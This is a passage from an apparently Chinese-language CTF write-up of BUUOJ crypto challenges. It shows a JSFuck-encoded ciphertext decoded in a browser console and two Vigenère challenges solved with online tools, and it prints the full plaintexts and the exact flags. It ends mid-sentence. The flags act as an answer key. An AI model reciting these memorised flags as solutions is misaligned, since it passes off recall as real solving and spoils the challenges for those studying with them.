title="8.jsfuck-()[]+!-这是什么"></a>8.jsfuck-<code>()[]+!</code>-这是什么</h2><p>看到apk，顺手改成rar解压发现是doc，后缀名再改成doc，打开发现ciphertext</p><pre class="line-numbers language-ciphertext" data-language="ciphertext"><code class="language-ciphertext">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(![]+[])[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+([][[]]+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[+[]]+(+(+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+[]])+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+[!+[]+!+[]]+[+[]]+[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[])[+!+[]]+[!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现是jsfuck之后首先想到的是找在线的网站，结果他在线的网站不中用，后来才想起来直接在控制台解密多好</p><p><img src="/2020/11/25/BUUOJ-crypto/image-20210503223932200.png" alt="image-20210503223932200"></p><p><code>flag&#123;a0448fd730b62c13ca80200c4529daa2&#125;</code></p><h2 id="9-维吉尼亚密码-MRCTF2020-vigenere"><a href="#9-维吉尼亚密码-MRCTF2020-vigenere" class="headerlink" title="9.维吉尼亚密码-[MRCTF2020]vigenere"></a>9.维吉尼亚密码-[MRCTF2020]vigenere</h2><p><img src="/2020/11/25/BUUOJ-crypto/image-20210504105314536.png" alt="image-20210504105314536"></p><p>懒得自己写爆破脚本，况且当key的位数也太长了，如果只有四位一下，可以尝试自己爆破，但是有在线的就显得十分没有必要了，网站在这篇文章头上。</p><pre class="line-numbers language-source_text" data-language="source_text"><code class="language-source_text">a declaration of the independence of cyberspaceby john perry barlow governments of the industrial world, you weary giants of flesh and steel, i come from cyberspace, the new home of mind. on behalf of the future, i ask you of the past to leave us alone. you are not welcome among us. you have no sovereignty where we gather.we have no elected government, nor are we likely to have one, so i address you with no greater authority than that with which liberty itself always speaks. i declare the global social space we are building to be naturally independent of the tyrannies you seek to impose on us. you have no moral right to rule us nor do you possess any methods of enforcement we have true reason to fear.governments derive their just powers from the consent of the governed. you have neither solicited nor received ours. we did not invite you. you do not know us, nor do you know our world. cyberspace does not lie within your borders. do not think that you can build it, as though it were a public construction project. you cannot. it is an act of nature and it grows itself through our collective actions.you have not engaged in our great and gathering conversation, nor did you create the wealth of our marketplaces. you do not know our culture, our ethics, or the unwritten codes that already provide our society more order than could be obtained by any of your impositions.you claim there are problems among us that you need to solve. you use this claim as an excuse to invade our precincts. many of these problems don&#39;t exist. where there are real conflicts, where there are wrongs, we will identify them and address them by our means. we are forming our own social contract. this governance will arise according to the conditions of our world, not yours. our world is different.cyberspace consists of transactions, relationships, and thought itself, arrayed like a standing wave in the web of our communications. ours is a world that is both everywhere and nowhere, but it is not where bodies live.we are creating a world that all may enter without privilege or prejudice accorded by race, economic power, military force, or station of birth.we are creating a world where anyone, anywhere may express his or her beliefs, no matter how singular, without fear of being coerced into silence or conformity.your legal concepts of property, expression, identity, movement, and context do not apply to us. they are all based on matter, and there is no matter here.our identities have no bodies, so, unlike you, we cannot obtain order by physical coercion. we believe that from ethics, enlightened self-interest, and the commonweal, our governance will emerge. our identities may be distributed across many of your jurisdictions. the only law that all our constituent cultures would generally recognize is the golden rule. we hope we will be able to build our particular solutions on that basis. but we cannot accept the solutions you are attempting to impose.in the united states, you have today created a law, the telecommunications reform act, which repudiates your own constitution and insults the dreams of jefferson, washington, mill, madison, detoqueville, and brandeis. these dreams must now be born anew in us.you are terrified of your own children, since they are natives in a world where you will always be immigrants. because you fear them, you entrust your bureaucracies with the parental responsibilities you are too cowardly to confront yourselves. in our world, all the sentiments and expressions of humanity, from the debasing to the angelic, are parts of a seamless whole, the global conversation of bits. we cannot separate the air that chokes from the air upon which wings beat.in china, germany, france, russia, singapore, italy and the united states, you are trying to ward off the virus of liberty by erecting guard posts at the frontiers of cyberspace. these may keep out the contagion for a small time, but they will not work in a world that will soon be blanketed in bit-bearing media.your increasingly obsolete information industries would perpetuate themselves by proposing laws, in america and elsewhere, that claim to own speech itself throughout the world. these laws would declare ideas to be another industrial product, no more noble than pig iron. in our world, whatever the human mind may create can be reproduced and distributed infinitely at no cost. the global conveyance of thought no longer requires your factories to accomplish.these increasingly hostile and colonial measures place us in the same position as those previous lovers of freedom and self-determination who had to reject the authorities of distant, uninformed powers. we must declare our virtual selves immune to your sovereignty, even as we continue to consent to your rule over our bodies. we will spread ourselves across the planet so that no one can arrest our thoughts.we will create a civilization of the mind in cyberspace. may it be more humane and fair than the world your governments have made before.flag is mrctf vigenere crypto crack man, please add underscore and curly braces.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">mrctf&#123;vigenere_crypto_crack_man&#125;flag&#123;vigenere_crypto_crack_man&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="维吉尼亚密码-AFCTF2018-Vigenere"><a href="#维吉尼亚密码-AFCTF2018-Vigenere" class="headerlink" title="维吉尼亚密码-[AFCTF2018]Vigenère"></a>维吉尼亚密码-[AFCTF2018]Vigenère</h2><p><img src="/2020/11/25/BUUOJ-crypto/image-20210504220959911.png" alt="image-20210504220959911"></p><p>还是直接在线解，哎，挺无聊的。。。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">When in the Course of human events it becomes necessary for one people to dissolve the political bands which have connected them with another and to assume among the powers of the earth, the separate and equal station to which the Laws of Nature and of Nature&#39;s God entitle them, a decent respect to the opinions of mankind requires that they should declare the causes which impel them to the separation.We hold these truths to be self-evident, that all men are created equal, that they are endowed by their Creator with certain unalienable Rights, that among these are Life, Liberty and the pursuit of Happiness. — That to secure these rights, Governments are instituted among Men, deriving their just powers from the consent of the governed, — That whenever any Form of Government becomes destructive of these ends, it is the Right of the People to alter or to abolish it, and to institute new Government, laying its foundation on such principles and organizing its powers in such form, as to them shall seem most likely to effect their Safety and Happiness. Prudence, indeed, will dictate that Governments long established should not be changed for light and transient causes; and accordingly all experience hath shewn that mankind are more disposed to suffer, while evils are sufferable than to right themselves by abolishing the forms to which they are accustomed. But when a long train of abuses and usurpations, pursuing invariably the same Object evinces a design to reduce them under absolute Despotism, it is their right, it is their duty, to throw off such Government, and to provide new Guards for their future security. — Such has been the patient sufferance of these Colonies; and such is now the necessity which constrains them to alter their former Systems of Government. The history of the present King of Great Britain is a history of repeated injuries and usurpations, all having in direct object the establishment of an absolute Tyranny over these States. To prove this, let Facts be submitted to a candid world.He has refused his Assent to Laws, the most wholesome and necessary for the public good.He has forbidden his Governors to pass Laws of immediate and pressing importance, unless suspended in their operation till his Assent should be obtained; and when so suspended, he has utterly neglected to attend to them.He has refused to pass other Laws for the accommodation of large districts of people, unless those people would relinquish the right of Representation in the Legislature, a right inestimable to them and formidable to tyrants only.He has called together legislative bodies at places unusual, uncomfortable, and distant from the depository of their Public Records, for the sole purpose of fatiguing them into compliance with his measures.He has dissolved Representative Houses repeatedly, for opposing with manly firmness his invasions on the rights of the people.He has refused for a long time, after such dissolutions, to cause others to be elected, whereby the Legislative Powers, incapable of Annihilation, have returned to the People at large for their exercise; the State remaining in the mean time exposed to all the dangers of invasion from without, and convulsions within.He has endeavoured to prevent the population of these States; for that purpose obstructing the Laws for Naturalization of Foreigners; refusing to pass others to encourage their migrations hither, and raising the conditions of new Appropriations of Lands.He has obstructed the Administration of Justice by refusing his Assent to Laws for establishing Judiciary Powers.He has made Judges 